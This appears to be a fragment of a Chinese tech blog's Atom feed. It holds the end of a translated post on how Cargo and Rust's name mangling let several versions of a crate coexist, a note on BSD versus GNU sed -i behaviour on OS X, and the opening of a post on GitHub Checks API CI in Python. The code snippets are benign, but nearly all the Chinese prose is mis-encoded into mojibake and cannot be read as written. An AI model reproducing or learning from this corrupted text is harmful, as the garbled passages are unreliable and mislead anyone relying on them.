id="rust-de-jie-jue-fang-an">Rustçš„è§£å†³æ–¹æ¡ˆ</span></h2><p>åœ¨è¿›è¡Œè¿™äº›è®¨è®ºæ—¶ï¼Œæˆ‘ä¼šç»å¸¸æåˆ°è¿™æ˜¯ä¸€ä¸ªä¸é€‚ç”¨äºæ‰€æœ‰è¯­è¨€çš„é—®é¢˜ï¼Œä½œä¸ºä¸€ä¸ªä¾‹å­ï¼ŒRustâ€œè§£å†³â€äº†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘å¸¸å¸¸æ‹¿Rustå¦‚ä½•è§£å†³ä¸–ç•Œä¸Šæ‰€æœ‰çš„é—®é¢˜å¼€ç©ç¬‘ï¼Œä½†åœ¨é‚£é‡Œé€šå¸¸æœ‰ä¸€ä¸ªçœŸå®çš„æ ¸å¿ƒã€‚å› æ­¤ï¼Œå½“æˆ‘è¯´Rustâ€œè§£å†³â€äº†è¿™ä¸ªé—®é¢˜ä»¥åŠå®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„æ—¶å€™ï¼Œè®©æˆ‘ä»¬æ·±å…¥äº†è§£ä¸€ä¸‹æˆ‘çš„æ„æ€ã€‚</p><p>Rustçš„è§£å†³æ–¹æ¡ˆæ¶‰åŠç›¸å½“å¤šçš„åŠ¨äººçš„éƒ¨åˆ†ï¼Œä½†å®ƒåŸºæœ¬ä¸Šå½’ç»“ä¸ºæŒ‘æˆ˜æˆ‘ä»¬åœ¨æ­¤ä¹‹å‰åšå‡ºçš„æ ¸å¿ƒå‡è®¾ï¼š</p><blockquote><p>æœ€ç»ˆåº”ç”¨ç¨‹åºä¸­åªåº”å­˜åœ¨ä»»ä½•ç»™å®šåŒ…çš„ä¸€ä¸ªç‰ˆæœ¬ã€‚</p></blockquote><p>RustæŒ‘æˆ˜äº†è¿™ä¸€ç‚¹ï¼Œä»¥ä¾¿é‡æ„é—®é¢˜ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ä¸€ä¸ªåœ¨ä¾èµ–åœ°ç‹±ä¹‹å¤–æ›´å¥½çš„è§£å†³æ–¹æ¡ˆã€‚Rustå¹³å°ä¸»è¦æœ‰ä¸¤ä¸ªåŠŸèƒ½å¯ä»¥ååŒå·¥ä½œï¼Œä¸ºè§£å†³è¿™äº›ä¾èµ–é—®é¢˜æä¾›åŸºç¡€ï¼Œç°åœ¨æˆ‘ä»¬å°†åˆ†åˆ«ç ”ç©¶å¹¶çœ‹çœ‹æœ€ç»ˆç»“æœæ˜¯æ€æ ·çš„ã€‚</p><h2><span id="cargo-he-crates">Cargoå’ŒCrates</span></h2><p>éš¾é¢˜çš„ç¬¬ä¸€éƒ¨åˆ†å½“ç„¶æ˜¯Cargoï¼ŒRustå®˜æ–¹ä¾èµ–ç®¡ç†å™¨ã€‚Cargoç±»ä¼¼äºNPMæˆ–Mavenä¹‹ç±»çš„å·¥å…·ï¼Œå¹¶ä¸”æœ‰ä¸€äº›æœ‰è¶£çš„åŠŸèƒ½ä½¿å®ƒæˆä¸ºä¸€ä¸ªçœŸæ­£é«˜è´¨é‡çš„ä¾èµ–ç®¡ç†å™¨ï¼ˆè¿™é‡Œæˆ‘æœ€å–œæ¬¢çš„æ˜¯<a href="https://getcomposer.org/">Composer</a>ï¼Œä¸€ä¸ªéå¸¸ç²¾å¿ƒè®¾è®¡çš„PHPä¾èµ–ç®¡ç†å™¨ï¼‰ã€‚Cargoè´Ÿè´£ä¸‹è½½é¡¹ç›®ä¾èµ–çš„Ruståº“ï¼Œç§°ä¸º<em>crates</em>ï¼Œå¹¶åè°ƒè°ƒç”¨Rustç¼–è¯‘å™¨ä»¥è·å¾—æœ€ç»ˆç»“æœã€‚</p><p><em>è¯·æ³¨æ„ï¼Œcratesæ˜¯ç¼–è¯‘å™¨ä¸­çš„ç¬¬ä¸€ç±»æ„é€ ã€‚è¿™åœ¨ä»¥åå¾ˆé‡è¦ã€‚</em></p><p>ä¸NPMå’ŒComposerä¸€æ ·ï¼ŒCargoå…è®¸ä½ æ ¹æ®<a href="https://semver.org/">è¯­ä¹‰ç‰ˆæœ¬æ§åˆ¶</a>çš„å…¼å®¹æ€§è§„åˆ™æŒ‡å®šé¡¹ç›®å…¼å®¹çš„ä¸€ç³»åˆ—ä¾èµ–é¡¹ç‰ˆæœ¬ã€‚è¿™å…è®¸ä½ æè¿°ä¸ä½ çš„ä»£ç å…¼å®¹ï¼ˆæˆ–å¯èƒ½ï¼‰å…¼å®¹çš„ä¸€ä¸ªæˆ–å¤šä¸ªç‰ˆæœ¬ã€‚ä¾‹å¦‚ï¼Œæˆ‘å¯èƒ½ä¼šæ·»åŠ </p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">log = <span class="string">&quot;0.4.*&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ°<code>Cargo.toml</code>æ–‡ä»¶ï¼Œè¡¨æ˜æˆ‘çš„ä»£ç é€‚ç”¨äº<code>0.4</code>ç³»åˆ—ä¸­<code>log</code>åŒ…çš„ä»»ä½•è¡¥ä¸ç‰ˆæœ¬ã€‚ä¹Ÿè®¸åœ¨æœ€ç»ˆçš„åº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°äº†è¿™ä¸ªä¾èµ–æ ‘</p><p><img src="https://user-images.githubusercontent.com/3297411/56954708-07a1d180-6b72-11e9-84f5-4b33c8d71a57.png" alt="second"></p><p>å› ä¸ºåœ¨<code>my-project</code>ä¸­æˆ‘å£°æ˜äº†ä¸<code>log</code>ç‰ˆæœ¬<code>0.4.*</code>çš„å…¼å®¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°ä¸º<code>log</code>é€‰æ‹©ç‰ˆæœ¬<code>0.4.4</code>ï¼Œå› ä¸ºå®ƒæ»¡è¶³æ‰€æœ‰è¦æ±‚ã€‚ï¼ˆå¦‚æœ<code>log</code>åŒ…éµå¾ªè¯­ä¹‰ç‰ˆæœ¬æ§åˆ¶çš„åŸåˆ™ï¼Œè¿™ä¸ªåŸåˆ™å¯¹äºå·²å‘å¸ƒçš„åº“è€Œè¨€å¹¶ä¸æ€»æ˜¯å¦‚æ­¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¡®ä¿¡è¿™ä¸ªå‘å¸ƒä¸åŒ…æ‹¬ä»»ä½•ä¼šç ´åæˆ‘ä»¬ä»£ç çš„é‡å¤§æ›´æ”¹ã€‚ï¼‰ä½ å¯ä»¥åœ¨<a href="https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html">Cargoæ–‡æ¡£</a>ä¸­æ‰¾åˆ°ä¸€ä¸ªæ›´å¥½åœ°è§£é‡Šç‰ˆæœ¬èŒƒå›´ä»¥åŠå®ƒä»¬å¦‚ä½•åº”ç”¨äºCargoã€‚</p><p>å¤ªæ£’äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ»¡è¶³<em>æ¯ä¸ª</em>é¡¹ç›®ç‰ˆæœ¬è¦æ±‚çš„æœ€æ–°ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é€‰æ‹©é¿å¼€é‡åˆ°ç‰ˆæœ¬å†²çªæˆ–åªæ˜¯é€‰æ‹©æ›´æ–°çš„ç‰ˆæœ¬å¹¶ç¥ˆç¥·ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬é‡åˆ°æ— æ³•è§£å†³çš„é—®é¢˜ï¼Œä¾‹å¦‚ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/56954694-feb10000-6b71-11e9-977f-c938f7eadce1.png" alt="third"></p><p>æ²¡æœ‰å¯ä»¥é€‰æ‹©æ»¡è¶³æ‰€æœ‰è¦æ±‚çš„<code>log</code>ç‰ˆæœ¬ï¼æˆ‘ä»¬æ¥ä¸‹æ¥åšä»€ä¹ˆï¼Ÿ</p><h2><span id="ming-zi-xiu-shi">åå­—ä¿®é¥°</span></h2><p>ä¸ºäº†å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦è®¨è®º<em>åå­—ä¿®é¥°</em>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåå­—ä¿®é¥°æ˜¯ä¸€äº›ç¼–è¯‘å™¨ç”¨äºå„ç§è¯­è¨€çš„è¿‡ç¨‹ï¼Œå®ƒå°†ç¬¦å·åç§°ä½œä¸ºè¾“å…¥ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªæ›´ç®€å•çš„å­—ç¬¦ä¸²ä½œä¸ºè¾“å‡ºï¼Œå¯ç”¨äºåœ¨é“¾æ¥æ—¶æ¶ˆé™¤ç±»ä¼¼å‘½åç¬¦å·çš„æ­§ä¹‰ã€‚ä¾‹å¦‚ï¼ŒRustå…è®¸ä½ åœ¨ä¸åŒæ¨¡å—ä¹‹é—´é‡ç”¨æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> en &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">greet</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mod</span> es &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">greet</span>() &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Hola&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸åŒçš„å‡½æ•°ï¼Œåä¸º<code>greet()</code>ï¼Œä½†å½“ç„¶è¿™å¾ˆå¥½ï¼Œå› ä¸ºå®ƒä»¬åœ¨ä¸åŒçš„æ¨¡å—ä¸­ã€‚è¿™å¾ˆæ–¹ä¾¿ï¼Œä½†é€šå¸¸åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ ¼å¼æ²¡æœ‰æ¨¡å—çš„æ¦‚å¿µï¼›ç›¸åï¼Œæ‰€æœ‰ç¬¦å·éƒ½å­˜åœ¨äºå•ä¸ªå…¨å±€å‘½åç©ºé—´ä¸­ï¼Œéå¸¸ç±»ä¼¼äºCä¸­çš„åç§°ã€‚ç”±äº<code>greet()</code>åœ¨æœ€ç»ˆäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ä¸èƒ½æ˜¾ç¤ºä¸¤æ¬¡ï¼Œå› æ­¤ç¼–è¯‘å™¨å¯èƒ½ä½¿ç”¨æ¯”æºä»£ç æ›´æ˜ç¡®çš„åç§°ã€‚ä¾‹å¦‚ï¼š</p><ul><li><code>en::greet()</code>æˆä¸º<code>en__greet</code></li><li><code>es::greet()</code>æˆä¸º<code>es__greet</code></li></ul><p>é—®é¢˜è§£å†³äº†ï¼åªè¦æˆ‘ä»¬ç¡®ä¿è¿™ä¸ªåå­—ä¿®é¥°æ–¹æ¡ˆæ˜¯ç¡®å®šæ€§çš„å¹¶ä¸”åœ¨ç¼–è¯‘æœŸé—´åˆ°å¤„ä½¿ç”¨ï¼Œä»£ç å°±ä¼šçŸ¥é“å¦‚ä½•è·å¾—æ­£ç¡®çš„å‡½æ•°ã€‚</p><p>ç°åœ¨è¿™ä¸æ˜¯ä¸€ä¸ªå®Œå…¨å®Œæ•´çš„åå­—ä¿®é¥°æ–¹æ¡ˆï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è€ƒè™‘å¾ˆå¤šå…¶ä»–çš„ä¸œè¥¿ï¼Œæ¯”å¦‚æ³›å‹ç±»å‹å‚æ•°ï¼Œé‡è½½ç­‰ç­‰ã€‚æ­¤åŠŸèƒ½ä¹Ÿä¸æ˜¯Rustç‹¬æœ‰çš„ï¼Œå¹¶ä¸”ç¡®å®åœ¨C++å’ŒFortranç­‰è¯­è¨€ä¸­ä½¿ç”¨äº†å¾ˆé•¿æ—¶é—´ã€‚</p><p>åå­—ä¿®é¥°å¦‚ä½•å¸®åŠ©Rustè§£å†³ä¾èµ–åœ°ç‹±ï¼Ÿè¿™ä¸€åˆ‡éƒ½åœ¨Rustçš„åå­—ç®¡ç†ä½“ç³»ä¸­ï¼Œè¿™ä¼¼ä¹åœ¨æˆ‘æ‰€ç ”ç©¶çš„è¯­è¨€ä¸­ç›¸å½“ç‹¬ç‰¹ã€‚é‚£ä¹ˆè®©æˆ‘ä»¬æ¥çœ‹çœ‹ï¼Ÿ</p><p>åœ¨Rustç¼–è¯‘å™¨ä¸­æŸ¥æ‰¾åå­—ä¿®é¥°çš„ä»£ç å¾ˆç®€å•ï¼›å®ƒä½äºä¸€ä¸ªåä¸º<a href="https://github.com/rust-lang/rust/blob/0550766699a6602a51e361e8cb2825b540b7cce8/src/librustc_codegen_utils/symbol_names.rs"><code>symbol_names.rs</code></a>çš„æ–‡ä»¶ä¸­ã€‚å¦‚æœä½ æƒ³å­¦ä¹ æ›´å¤šå†…å®¹ï¼Œæˆ‘å»ºè®®ä½ é˜…è¯»è¿™ä¸ªæ–‡ä»¶ä¸­çš„æ³¨é‡Šï¼Œä½†æˆ‘ä¼šåŒ…æ‹¬é‡ç‚¹ã€‚ä¼¼ä¹æœ‰å››ä¸ªåŸºæœ¬ç»„ä»¶åŒ…å«åœ¨ä¸€ä¸ªä¿®é¥°ç¬¦å·åç§°ä¸­ï¼š</p><ul><li>ç¬¦å·çš„å®Œå…¨é™å®šåç§°ã€‚</li><li>é€šç”¨ç±»å‹å‚æ•°ã€‚</li><li>åŒ…å«ç¬¦å·çš„crateçš„åç§°ã€‚ï¼ˆè¿˜è®°å¾—cratesåœ¨ç¼–è¯‘å™¨ä¸­æ˜¯ä¸€æµçš„å—ï¼Ÿï¼‰</li><li>å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä¼ å…¥çš„ä»»æ„â€œæ­§ä¹‰æ¶ˆé™¤å™¨ï¼ˆdisambiguatorï¼‰â€å­—ç¬¦ä¸²ã€‚</li></ul><p>ä½¿ç”¨Cargoæ—¶ï¼ŒCargoæœ¬èº«ä¼šå°†â€œæ­§ä¹‰æ¶ˆé™¤å™¨â€æä¾›ç»™ç¼–è¯‘å™¨ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>compilation_files.rs</code>åŒ…å«çš„å†…å®¹ï¼š</p><ul><li>åŒ…åå­—</li><li>åŒ…æº</li><li>åŒ…ç‰ˆæœ¬</li><li>å¯ç”¨ç¼–è¯‘æ—¶åŠŸèƒ½</li><li><em>ä¸€å †</em>å…¶ä»–çš„ä¸œè¥¿</li></ul><p>è¿™ä¸ªå¤æ‚ç³»ç»Ÿçš„æœ€ç»ˆç»“æœæ˜¯ï¼Œå³ä½¿æ˜¯ä¸åŒç‰ˆæœ¬çš„crateä¸­çš„ç›¸åŒåŠŸèƒ½ä¹Ÿå…·æœ‰ä¸åŒçš„ä¿®é¥°ç¬¦å·åç§°ï¼Œå› æ­¤åªè¦æ¯ä¸ªç»„ä»¶çŸ¥é“è¦è°ƒç”¨çš„å‡½æ•°ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åœ¨å•ä¸ªåº”ç”¨ç¨‹åºä¸­å…±å­˜ã€‚</p><h2><span id="he-zai-yi-qi">åˆåœ¨ä¸€èµ·</span></h2><p>ç°åœ¨å›åˆ°æˆ‘ä»¬ä¹‹å‰çš„â€œæ— æ³•è§£å†³çš„â€ä¾èµ–å›¾ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/56954658-e7721280-6b71-11e9-8df8-aa5e6efa01f7.png" alt="forth"></p><p>å€ŸåŠ©ä¾èµ–èŒƒå›´çš„å¼ºå¤§åŠŸèƒ½ï¼Œä»¥åŠCargoå’ŒRustç¼–è¯‘å™¨ååŒå·¥ä½œï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥é€šè¿‡åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­åŒ…å«<code>log 0.5.0</code>å’Œ<code>log 0.4.4</code>æ¥å®é™…è§£å†³æ­¤ä¾èµ–å…³ç³»å›¾ã€‚<code>app</code>å†…éƒ¨ä½¿ç”¨<code>log</code>çš„ä»»ä½•ä»£ç éƒ½å°†è¢«ç¼–è¯‘ä»¥è¾¾åˆ°ä»<code>0.5.0</code>ç‰ˆç”Ÿæˆçš„ç¬¦å·ï¼Œè€Œ<code>my-project</code>ä¸­çš„ä»£ç å°†ä½¿ç”¨ä¸º<code>0.4.4</code>ç‰ˆç”Ÿæˆçš„ç¬¦å·ã€‚</p><p>ç°åœ¨æˆ‘ä»¬çœ‹åˆ°äº†å¤§å±€ï¼Œè¿™å®é™…ä¸Šçœ‹èµ·æ¥éå¸¸ç›´è§‚ï¼Œå¹¶è§£å†³äº†ä¸€å¤§å †ä¾èµ–é—®é¢˜ï¼Œè¿™äº›é—®é¢˜ä¼šå›°æ‰°å…¶ä»–è¯­è¨€çš„ç”¨æˆ·ã€‚è¿™ä¸ªè§£å†³æ–¹æ¡ˆå¹¶ä¸å®Œç¾ï¼š</p><ul><li>ç”±äºä¸åŒç‰ˆæœ¬ç”Ÿæˆä¸åŒçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•åœ¨åº“çš„ä¸åŒç‰ˆæœ¬ä¹‹é—´ä¼ é€’å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ— æ³•åˆ›å»ºä¸€ä¸ª<code>log 0.5.0</code>çš„<code>LogLevel</code>å¹¶å°†å…¶ä¼ é€’ç»™<code>my-project</code>ä½¿ç”¨ï¼Œå› ä¸ºå®ƒæœŸæœ›<code>LogLevel</code>æ¥è‡ª<code>log 0.4.4</code>ï¼Œå¹¶ä¸”å®ƒä»¬å¿…é¡»è¢«è§†ä¸ºå•ç‹¬çš„ç±»å‹ã€‚</li><li>å¯¹äºåº“çš„æ¯ä¸ªå®ä¾‹ï¼Œä»»ä½•é™æ€å˜é‡æˆ–å…¨å±€çŠ¶æ€éƒ½å°†è¢«å¤åˆ¶ï¼Œå¦‚æœæ²¡æœ‰ä¸€äº›ç‰¹æ®Šæ–¹æ³•ï¼Œå®ƒä»¬å°±æ— æ³•é€šä¿¡ã€‚</li><li>æˆ‘ä»¬çš„äºŒè¿›åˆ¶å¤§å°å¿…ç„¶ä¼šå› ä¸ºæˆ‘ä»¬åº”ç”¨ç¨‹åºä¸­åŒ…å«çš„åº“çš„æ¯ä¸ªå®ä¾‹è€Œå¢åŠ ã€‚</li></ul><p>ç”±äºè¿™äº›ç¼ºç‚¹ï¼ŒCargoä»…åœ¨éœ€è¦æ—¶æ‰é‡‡ç”¨è¿™ç§æŠ€æœ¯æ¥è§£å†³ä¾èµ–å›¾ã€‚</p><p>ä¸ºäº†è§£å†³ä¸€èˆ¬ç”¨ä¾‹ï¼Œè¿™äº›ä¼¼ä¹å€¼å¾—ä¸ºRuståšå‡ºæƒè¡¡ï¼Œä½†å¯¹äºå…¶ä»–è¯­è¨€ï¼Œé‡‡ç”¨è¿™æ ·çš„ä¸œè¥¿å¯èƒ½ä¼šæ›´åŠ å›°éš¾ã€‚ä»¥Javaä¸ºä¾‹ï¼ŒJava<em>ä¸¥é‡</em>ä¾èµ–äºé™æ€å­—æ®µå’Œå…¨å±€çŠ¶æ€ï¼Œå› æ­¤ç®€å•åœ°å¤§è§„æ¨¡é‡‡ç”¨Rustçš„æ–¹æ³•è‚¯å®šä¼šå¢åŠ ç ´åä»£ç çš„æ¬¡æ•°ï¼Œè€ŒRuståˆ™å°†å…¨å±€çŠ¶æ€é™åˆ¶åœ¨æœ€ä½é™åº¦ã€‚è¿™ç§è®¾è®¡ä¹Ÿæ²¡æœ‰å¯¹åœ¨è¿è¡Œæ—¶æˆ–åå°„æ—¶åŠ è½½ä»»æ„åº“è¿›è¡Œè¯´æ˜ï¼Œè¿™ä¸¤è€…éƒ½æ˜¯è®¸å¤šå…¶ä»–è¯­è¨€æä¾›çš„æµè¡ŒåŠŸèƒ½ã€‚</p><h2><span id="jie-lun">ç»“è®º</span></h2><p>Ruståœ¨ç¼–è¯‘å’Œæ‰“åŒ…æ–¹é¢çš„ç²¾å¿ƒè®¾è®¡ä»¥ï¼ˆä¸»è¦ï¼‰æ— ç—›ä¾èµ–ç®¡ç†çš„å½¢å¼å¸¦æ¥çº¢åˆ©ï¼Œè¿™é€šå¸¸æ¶ˆé™¤äº†å¯èƒ½æˆä¸ºå¼€å‘äººå‘˜åœ¨å…¶ä»–è¯­è¨€ä¸­æœ€ç³Ÿç³•çš„å™©æ¢¦çš„æ•´ç±»é—®é¢˜ã€‚å½“æˆ‘ç¬¬ä¸€æ¬¡å¼€å§‹ç©Rustçš„æ—¶å€™ï¼Œæˆ‘å½“ç„¶å¾ˆå–œæ¬¢æˆ‘æ‰€çœ‹åˆ°çš„ï¼Œæ·±å…¥äº†è§£å†…éƒ¨ï¼Œçœ‹åˆ°å®å¤§çš„æ¶æ„ï¼Œå‘¨åˆ°çš„è®¾è®¡ï¼Œä»¥åŠåˆç†çš„æƒè¡¡å–èˆå¯¹æˆ‘æ¥è¯´æ›´ä»¤äººå°è±¡æ·±åˆ»ã€‚è¿™åªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªä¾‹å­ã€‚</p><p>å³ä½¿ä½ æ²¡æœ‰ä½¿ç”¨Rustï¼Œå¸Œæœ›è¿™ä¼šè®©ä½ å¯¹ä¾èµ–ç®¡ç†å™¨ï¼Œç¼–è¯‘å™¨ä»¥åŠä»–ä»¬å¿…é¡»è§£å†³çš„æ£˜æ‰‹é—®é¢˜ç»™äºˆæ–°çš„é‡è§†ã€‚ï¼ˆè™½ç„¶æˆ‘é¼“åŠ±ä½ è‡³å°‘å°è¯•ä¸€ä¸‹Rustï¼Œå½“ç„¶â€¦ï¼‰</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Rustå¦‚ä½•è§£å†³ä¾èµ–åœ°ç‹±
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ OS X ä¸Šä½¿ç”¨ sed å‘½ä»¤çš„ä¸€äº›æ³¨æ„</title>
    <link href="https://qiwihui.com/qiwihui-blog-48/"/>
    <id>https://qiwihui.com/qiwihui-blog-48/</id>
    <published>2022-08-13T01:54:25.530Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ OS X ä¸Šä½¿ç”¨ <code>sed</code> ä¼šå’Œ GNU ä¸Šä¸å¤ªä¸€è‡´ï¼Œåœ¨æ­¤è®°å½•ã€‚</p><ol><li>OS X <code>sed</code> ä¸å¯å¿½ç•¥å¤‡ä»½æ‰©å±•</li></ol><span id="more"></span><h3><span id="bu-ke-hu-lue-bei-fen-kuo-zhan">ä¸å¯å¿½ç•¥å¤‡ä»½æ‰©å±•</span></h3><p>åœ¨ OS X ä¸Šè¿›è¡Œæ–‡æœ¬æ›¿æ¢æ—¶ï¼Œå¿…é¡»è¦æŒ‡å®šå¤‡ä»½æ‰©å±•ï¼Œå³ä½¿æ‰©å±•å¯ä»¥ä¸ºç©ºã€‚æ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i  <span class="string">&#x27;s/foo/bar/g&#x27;</span> target</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™è¡Œä»£ç ï¼Œå¯ä»¥åœ¨ GNU ä¸Šè¿è¡Œï¼Œä½œç”¨æ˜¯å°† <code>foo</code> æ›¿æ¢ä¸º <code>bar</code>ï¼Œå¹¶ä¸”ç›´æ¥ä¿®æ”¹ç›®æ ‡æ–‡ä»¶ï¼ˆ<code>-i</code>ï¼‰ã€‚ä½†æ˜¯å¦‚æœåœ¨ OS X ä¸Šï¼Œè¿™è¡Œå‘½ä»¤ä¼šæŠ¥é”™ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sed -i <span class="string">&#x27;s/foo/bar/g&#x27;</span> target </span><br><span class="line">sed: 1: <span class="string">&quot;target&quot;</span>: undefined label <span class="string">&#x27;arget&#x27;</span></span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯åœ¨ OS X ä¸Šï¼Œsed å‘½ä»¤å¿…é¡»æŒ‡å®šå¤‡ä»½çš„æ‰©å±•æ ¼å¼ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ man sed</span><br><span class="line"></span><br><span class="line">     -i extension</span><br><span class="line">             Edit files in-place, saving backups with the specified extension.  If a zero-length extension is given, no backup will be saved.  It is not recommended to give a</span><br><span class="line">             zero-length extension when in-place editing files, as you risk corruption or partial content <span class="keyword">in</span> situations <span class="built_in">where</span> disk space is exhausted, etc.</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸º</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s/foo/bar/g&#x27;</span> target </span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¥½çš„æ–¹æ³•é¿å…åˆ›å»ºå¤‡ä»½æ–‡ä»¶é—®é¢˜ï¼Œä»¥ä¸‹çš„æ–¹æ³•éƒ½åšä¸åˆ°å…¼å®¹ï¼š</p><ul><li><code>sed -i -e ...</code> - åœ¨ OS X ä¸Šä¸èµ·ä½œç”¨ï¼Œä¼šåˆ›å»º <code>-e</code> å¤‡ä»½</li><li><code>sed -i'' -e ...</code> - åœ¨ OS X 10.6 ä¸èµ·ä½œç”¨ï¼Œä½†åœ¨ 10.9+ å¯è¡Œ</li><li><code>sed -i '' -e ...</code> - åœ¨ GNU ä¸Šä¸èµ·ä½œç”¨</li></ul><p>æˆ–è€…ï¼Œåœ¨ OS X ä½¿ç”¨ <code>gnu-sed</code> ä»£æ›¿ sedï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install gnu-sed</span><br><span class="line"><span class="built_in">alias</span> sed=gsed</span><br></pre></td></tr></table></figure><p>åˆæˆ–è€…ï¼Œä½¿ç”¨å…¶ä»–å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -i -pe<span class="string">&#x27;s/foo/bar/g&#x27;</span> target</span><br></pre></td></tr></table></figure><h3><span id="can-kao">å‚è€ƒ</span></h3><ul><li><a href="https://stackoverflow.com/a/4247319/3218128">sed command with -i option failing on Mac, but works on Linux</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨ OS X ä¸Šä½¿ç”¨ sed å‘½ä»¤çš„ä¸€äº›æ³¨æ„
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Python é›†æˆ GitHub App å’Œ GitHub Check APIï¼Œæ„å»ºæŒç»­é›†æˆæœåŠ¡</title>
    <link href="https://qiwihui.com/qiwihui-blog-111/"/>
    <id>https://qiwihui.com/qiwihui-blog-111/</id>
    <published>2022-08-13T01:54:25.520Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡åšå®¢çš„èµ·å› æ˜¯åœ¨åšé¡¹ç›®çš„è¿‡ç¨‹ä¸­è¦æ±‚ä½¿ç”¨ Python å®Œæˆç›¸åº”åŠŸèƒ½ï¼Œç°åœ¨å°†è¿™éƒ¨ä»½ä»£ç æŒ‰æ•™ç¨‹çš„æµç¨‹å‘å¸ƒå‡ºæ¥ã€‚</p><p>åŸæ–‡<a href="https://docs.github.com/en/free-pro-team@latest/developers/apps/creating-ci-tests-with-the-checks-api">ã€Šä½¿ç”¨ Checks API åˆ›å»º CI æµ‹è¯•ã€‹</a>ä¸­ä½¿ç”¨ Rubyï¼Œç°ä½¿ç”¨ Python å®Œæˆæ–‡æ¡£ç¤ºä¾‹ã€‚ç”±äºæ•™ç¨‹å·²ç»å°†å¤§éƒ¨åˆ†å†…å®¹è¯¦ç»†æè¿°äº†ï¼Œæœ¬æ–‡åªåˆ—å‡ºä¸åŸæ¥æ•™ç¨‹æœ‰ä¸åŒçš„æ­¥éª¤ï¼Œä»¥åŠå¯¹åº”çš„ Python ä»£ç ã€‚</p><span id="more"></span><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/qiwihui/githubappcheckruns">qiwihui/githubappcheckruns</a></p><h2><span id="ji-ben-yao-qiu">åŸºæœ¬è¦æ±‚</span></h2><p>æ–‡æ¡£ï¼š<a 